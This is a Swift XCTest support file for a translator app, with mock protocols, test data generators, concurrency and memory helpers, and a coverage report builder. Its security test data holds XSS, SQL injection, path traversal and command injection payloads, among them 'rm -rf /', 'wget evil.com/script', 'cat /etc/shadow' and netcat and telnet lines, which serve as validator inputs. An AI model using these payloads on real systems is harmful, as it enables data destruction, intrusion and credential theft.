//
//  ComprehensiveTestConfiguration.swift
//  UniversalTranslatorTests
//
//  Test configuration and utilities for comprehensive unit test coverage.
//  Provides mock implementations, test helpers, and coverage validation.
//

import XCTest
import Foundation
import Combine
@testable import UniversalTranslator

// MARK: - Test Configuration

struct TestConfiguration {
    static let shared = TestConfiguration()
    
    // Test timeouts
    let defaultTimeout: TimeInterval = 5.0
    let networkTimeout: TimeInterval = 10.0
    let longRunningTimeout: TimeInterval = 30.0
    
    // Test data sizes
    let smallDataSize = 1024 // 1KB
    let mediumDataSize = 1024 * 100 // 100KB
    let largeDataSize = 1024 * 1024 // 1MB
    
    // Performance thresholds
    let maxEncryptionTime: TimeInterval = 0.1
    let maxValidationTime: TimeInterval = 0.05
    let maxRateLimitCheckTime: TimeInterval = 0.01
    
    // Coverage requirements
    let minimumCodeCoverage: Double = 80.0
    let minimumBranchCoverage: Double = 75.0
    let minimumFunctionCoverage: Double = 80.0
    
    private init() {}
}

// MARK: - Protocol Definitions for Mocking

protocol URLSessionProtocol {
    func data(for request: URLRequest) async throws -> (Data, URLResponse)
}

extension URLSession: URLSessionProtocol {}

protocol KeychainManagerProtocol {
    func save(_ data: Data, forKey key: String) throws
    func load(key: String) throws -> Data
    func delete(key: String) throws
}

enum KeychainError: Error {
    case unableToSave
    case itemNotFound
    case unableToDelete
    case invalidData
}

// MARK: - Test Data Generators

class TestDataGenerator {
    static let shared = TestDataGenerator()
    
    private init() {}
    
    // MARK: - OAuth2 Test Data
    
    func createValidOAuth2Token(expiresIn seconds: TimeInterval = 3600) -> OAuth2Token {
        return OAuth2Token(
            accessToken: "test_access_token_\(UUID().uuidString)",
            refreshToken: "test_refresh_token_\(UUID().uuidString)",
            expiresAt: Date().addingTimeInterval(seconds),
            scope: ["openid", "email", "profile"]
        )
    }
    
    func createExpiredOAuth2Token() -> OAuth2Token {
        return createValidOAuth2Token(expiresIn: -3600) // Expired 1 hour ago
    }
    
    func createTokenResponse(accessToken: String? = nil, refreshToken: String? = nil) -> TokenResponse {
        return TokenResponse(
            accessToken: accessToken ?? "test_access_token",
            refreshToken: refreshToken ?? "test_refresh_token",
            expiresIn: 3600,
            scope: "openid email profile"
        )
    }
    
    // MARK: - Encryption Test Data
    
    func createTestData(size: Int = 1024) -> Data {
        var data = Data(capacity: size)
        for i in 0..<size {
            data.append(UInt8(i % 256))
        }
        return data
    }
    
    func createRandomData(size: Int) -> Data {
        var data = Data(count: size)
        _ = data.withUnsafeMutableBytes { bytes in
            SecRandomCopyBytes(kSecRandomDefault, size, bytes.bindMemory(to: UInt8.self).baseAddress!)
        }
        return data
    }
    
    func createUnicodeTestStrings() -> [String] {
        return [
            "Basic ASCII text",
            "Café with accents",
            "Hello 世界", // Chinese
            "Привет мир", // Russian
            "مرحبا بالعالم", // Arabic
            "こんにちは世界", // Japanese
            "🌍🚀💫🎉", // Emojis
            "Ω≈ç√∫˜µ≤≥÷", // Special symbols
            "\u{1F468}\u{200D}\u{1F4BB}", // Composite emoji
        ]
    }
    
    // MARK: - Security Test Data
    
    func createXSSPayloads() -> [String] {
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<object data=javascript:alert('XSS')></object>",
            "<embed src=javascript:alert('XSS')></embed>",
            "<link rel=stylesheet href=javascript:alert('XSS')>",
            "<style>@import'javascript:alert(\"XSS\")'</style>",
            "<base href=javascript:alert('XSS')//>"]
    }
    
    func createSQLInjectionPayloads() -> [String] {
        return [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM passwords --",
            "admin'--",
            "admin'/**/--",
            "' OR 1=1#",
            "' OR 'a'='a",
            "') OR ('1'='1",
            "1' AND SLEEP(5)--",
            "'; EXEC xp_cmdshell('dir'); --"
        ]
    }
    
    func createCommandInjectionPayloads() -> [String] {
        return [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget evil.com/script",
            "`curl malicious.com`",
            "$(cat /etc/shadow)",
            "; ls -la",
            "| nc -l 4444",
            "&& chmod 777 /",
            "; ping -c 10 127.0.0.1",
            "| telnet attacker.com 80"
        ]
    }
    
    func createPathTraversalPayloads() -> [String] {
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/shadow",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "/var/www/../../etc/passwd",
            "/etc/passwd%00.jpg",
            "....\\....\\....\\windows\\system32",
            "file:///../../../sensitive.txt"
        ]
    }
    
    // MARK: - Network Test Data
    
    func createMockHTTPResponse(statusCode: Int = 200, data: Data? = nil) -> (Data, HTTPURLResponse) {
        let responseData = data ?? "Mock response".data(using: .utf8)!
        let response = HTTPURLResponse(
            url: URL(string: "https://example.com")!,
            statusCode: statusCode,
            httpVersion: "HTTP/1.1",
            headerFields: ["Content-Type": "application/json"]
        )!
        return (responseData, response)
    }
    
    func createMockURLRequest(url: String = "https://api.example.com/test", userAgent: String? = nil) -> URLRequest {
        var request = URLRequest(url: URL(string: url)!)
        if let userAgent = userAgent {
            request.setValue(userAgent, forHTTPHeaderField: "User-Agent")
        }
        return request
    }
    
    // MARK: - Audio Test Data
    
    func createValidAudioData(format: AudioFormat = .m4a) -> Data {
        switch format {
        case .m4a:
            return Data([0x66, 0x74, 0x79, 0x70]) + Data(repeating: 0x00, count: 1000)
        case .mp3:
            return Data([0x49, 0x44, 0x33]) + Data(repeating: 0x00, count: 1000)
        case .wav:
            return Data([0x52, 0x49, 0x46, 0x46]) + Data(repeating: 0x00, count: 1000)
        case .ogg:
            return Data([0x4F, 0x67, 0x67, 0x53]) + Data(repeating: 0x00, count: 1000)
        }
    }
    
    func createInvalidAudioData() -> Data {
        return Data([0x00, 0x01, 0x02, 0x03, 0x04]) // Invalid header
    }
    
    enum AudioFormat {
        case m4a, mp3, wav, ogg
    }
}

// MARK: - Test Helpers

class TestHelpers {
    static let shared = TestHelpers()
    
    private init() {}
    
    // MARK: - Async Testing Helpers
    
    func waitForCondition(
        _ condition: @escaping () -> Bool,
        timeout: TimeInterval = 5.0,
        polling: TimeInterval = 0.1
    ) async throws {
        let deadline = Date().addingTimeInterval(timeout)
        
        while Date() < deadline {
            if condition() {
                return
            }
            try await Task.sleep(nanoseconds: UInt64(polling * 1_000_000_000))
        }
        
        throw TestError.conditionTimeout
    }
    
    func measureAsyncOperation<T>(
        _ operation: () async throws -> T
    ) async rethrows -> (result: T, duration: TimeInterval) {
        let startTime = CFAbsoluteTimeGetCurrent()
        let result = try await operation()
        let endTime = CFAbsoluteTimeGetCurrent()
        return (result, endTime - startTime)
    }
    
    // MARK: - Memory Testing Helpers
    
    func getCurrentMemoryUsage() -> UInt64 {
        var info = mach_task_basic_info()
        var count = mach_msg_type_number_t(MemoryLayout<mach_task_basic_info>.size) / 4
        
        let result = withUnsafeMutablePointer(to: &info) {
            $0.withMemoryRebound(to: integer_t.self, capacity: 1) {
                task_info(mach_task_self_, task_flavor_t(MACH_TASK_BASIC_INFO), $0, &count)
            }
        }
        
        return result == KERN_SUCCESS ? info.resident_size : 0
    }
    
    func detectMemoryLeak<T>(
        iterations: Int = 100,
        tolerance: UInt64 = 1024 * 1024, // 1MB
        operation: () throws -> T
    ) throws -> Bool {
        let initialMemory = getCurrentMemoryUsage()
        
        for _ in 0..<iterations {
            _ = try operation()
        }
        
        // Force garbage collection
        for _ in 0..<3 {
            autoreleasepool {
                // Create and destroy objects to trigger cleanup
                _ = Array(0...1000)
            }
        }
        
        let finalMemory = getCurrentMemoryUsage()
        let memoryGrowth = finalMemory - initialMemory
        
        return memoryGrowth <= tolerance
    }
    
    // MARK: - Concurrency Testing Helpers
    
    func runConcurrentOperations<T>(
        count: Int,
        operation: @escaping () async throws -> T
    ) async throws -> [T] {
        return try await withThrowingTaskGroup(of: T.self) { group in
            for _ in 0..<count {
                group.addTask {
                    try await operation()
                }
            }
            
            var results: [T] = []
            for try await result in group {
                results.append(result)
            }
            return results
        }
    }
    
    func testThreadSafety<T>(
        iterations: Int = 1000,
        concurrency: Int = 10,
        operation: @escaping () -> T
    ) -> Bool {
        let group = DispatchGroup()
        let queue = DispatchQueue(label: "thread-safety-test", attributes: .concurrent)
        var hasRaceCondition = false
        let lock = NSLock()
        
        for _ in 0..<concurrency {
            group.enter()
            queue.async {
                defer { group.leave() }
                
                for _ in 0..<iterations {
                    _ = operation()
                    
                    // Check for race conditions or crashes
                    lock.lock()
                    // If we get here without crashing, that's good
                    lock.unlock()
                }
            }
        }
        
        let result = group.wait(timeout: .now() + 30)
        return result == .success && !hasRaceCondition
    }
    
    // MARK: - File System Helpers
    
    func createTemporaryFile(data: Data) throws -> URL {
        let tempDir = FileManager.default.temporaryDirectory
        let fileName = UUID().uuidString + ".tmp"
        let fileURL = tempDir.appendingPathComponent(fileName)
        try data.write(to: fileURL)
        return fileURL
    }
    
    func createTemporaryDirectory() throws -> URL {
        let tempDir = FileManager.default.temporaryDirectory
        let dirName = UUID().uuidString
        let dirURL = tempDir.appendingPathComponent(dirName)
        try FileManager.default.createDirectory(at: dirURL, withIntermediateDirectories: true)
        return dirURL
    }
    
    func cleanupTemporaryFiles(at urls: [URL]) {
        for url in urls {
            try? FileManager.default.removeItem(at: url)
        }
    }
}

// MARK: - Test Errors

enum TestError: Error, LocalizedError {
    case conditionTimeout
    case memoryLeakDetected
    case threadSafetyViolation
    case performanceThresholdExceeded
    case unexpectedNilValue
    case invalidTestData
    
    var errorDescription: String? {
        switch self {
        case .conditionTimeout:
            return "Test condition timed out"
        case .memoryLeakDetected:
            return "Memory leak detected during test"
        case .threadSafetyViolation:
            return "Thread safety violation detected"
        case .performanceThresholdExceeded:
            return "Performance threshold exceeded"
        case .unexpectedNilValue:
            return "Unexpected nil value encountered"
        case .invalidTestData:
            return "Invalid test data provided"
        }
    }
}

// MARK: - Coverage Reporting

class CoverageReporter {
    static let shared = CoverageReporter()
    
    private var testResults: [String: TestResult] = [:]
    
    private init() {}
    
    struct TestResult {
        let testName: String
        let passed: Bool
        let duration: TimeInterval
        let coverage: Double
        let errors: [Error]
    }
    
    func recordTest(
        name: String,
        passed: Bool,
        duration: TimeInterval,
        coverage: Double = 0.0,
        errors: [Error] = []
    ) {
        testResults[name] = TestResult(
            testName: name,
            passed: passed,
            duration: duration,
            coverage: coverage,
            errors: errors
        )
    }
    
    func generateCoverageReport() -> String {
        let totalTests = testResults.count
        let passedTests = testResults.values.filter { $0.passed }.count
        let totalDuration = testResults.values.reduce(0) { $0 + $1.duration }
        let averageCoverage = testResults.values.reduce(0) { $0 + $1.coverage } / Double(totalTests)
        
        let passRate = Double(passedTests) / Double(totalTests) * 100
        
        var report = """
        Test Coverage Report
        ===================
        
        Summary:
        - Total Tests: \(totalTests)
        - Passed Tests: \(passedTests)
        - Pass Rate: \(String(format: "%.1f", passRate))%
        - Total Duration: \(String(format: "%.2f", totalDuration))s
        - Average Coverage: \(String(format: "%.1f", averageCoverage))%
        
        Coverage Requirements:
        - Minimum Code Coverage: \(TestConfiguration.shared.minimumCodeCoverage)%
        - Minimum Branch Coverage: \(TestConfiguration.shared.minimumBranchCoverage)%
        - Minimum Function Coverage: \(TestConfiguration.shared.minimumFunctionCoverage)%
        
        Component Coverage:
        """
        
        let components = [
            "OAuth2Manager",
            "SecureEncryption", 
            "InputValidator",
            "RateLimiter",
            "SecurityMonitor",
            "EnhancedWatchSessionManager"
        ]
        
        for component in components {
            let componentTests = testResults.filter { $0.key.contains(component) }
            let componentCoverage = componentTests.isEmpty ? 0.0 :
                componentTests.values.reduce(0) { $0 + $1.coverage } / Double(componentTests.count)
            let status = componentCoverage >= TestConfiguration.shared.minimumCodeCoverage ? "✅" : "❌"
            
            report += "\n- \(component): \(String(format: "%.1f", componentCoverage))% \(status)"
        }
        
        report += "\n\nDetailed Test Results:\n"
        for (name, result) in testResults.sorted(by: { $0.key < $1.key }) {
            let status = result.passed ? "✅ PASS" : "❌ FAIL"
            report += "\n- \(name): \(status) (\(String(format: "%.2f", result.duration))s)"
            
            for error in result.errors {
                report += "\n  Error: \(error.localizedDescription)"
            }
        }
        
        return report
    }
    
    func validateCoverageRequirements() -> Bool {
        let config = TestConfiguration.shared
        let totalTests = testResults.count
        guard totalTests > 0 else { return false }
        
        let averageCoverage = testResults.values.reduce(0) { $0 + $1.coverage } / Double(totalTests)
        return averageCoverage >= config.minimumCodeCoverage
    }
}

// MARK: - Test Suite Extensions

extension XCTestCase {
    /// Helper to test async operations with timeout
    func testAsync(
        timeout: TimeInterval = TestConfiguration.shared.defaultTimeout,
        operation: @escaping () async throws -> Void
    ) {
        let expectation = expectation(description: "Async operation")
        
        Task {
            do {
                try await operation()
                expectation.fulfill()
            } catch {
                XCTFail("Async operation failed: \(error)")
                expectation.fulfill()
            }
        }
        
        waitForExpectations(timeout: timeout)
    }
    
    /// Helper to assert no memory leaks in operation
    func assertNoMemoryLeak<T>(
        iterations: Int = 100,
        tolerance: UInt64 = 1024 * 1024,
        operation: () throws -> T,
        file: StaticString = #file,
        line: UInt = #line
    ) {
        let noLeak = try! TestHelpers.shared.detectMemoryLeak(
            iterations: iterations,
            tolerance: tolerance,
            operation: operation
        )
        
        XCTAssertTrue(noLeak, "Memory leak detected", file: file, line: line)
    }
    
    /// Helper to assert thread safety
    func assertThreadSafe<T>(
        iterations: Int = 1000,
        concurrency: Int = 10,
        operation: @escaping () -> T,
        file: StaticString = #file,
        line: UInt = #line
    ) {
        let isThreadSafe = TestHelpers.shared.testThreadSafety(
            iterations: iterations,
            concurrency: concurrency,
            operation: operation
        )
        
        XCTAssertTrue(isThreadSafe, "Thread safety violation detected", file: file, line: line)
    }
    
    /// Helper to assert performance threshold
    func assertPerformance<T>(
        threshold: TimeInterval,
        operation: () throws -> T,
        file: StaticString = #file,
        line: UInt = #line
    ) {
        let startTime = CFAbsoluteTimeGetCurrent()
        _ = try! operation()
        let duration = CFAbsoluteTimeGetCurrent() - startTime
        
        XCTAssertLessThan(
            duration,
            threshold,
            "Operation took \(String(format: "%.3f", duration))s, expected < \(String(format: "%.3f", threshold))s",
            file: file,
            line: line
        )
    }
}
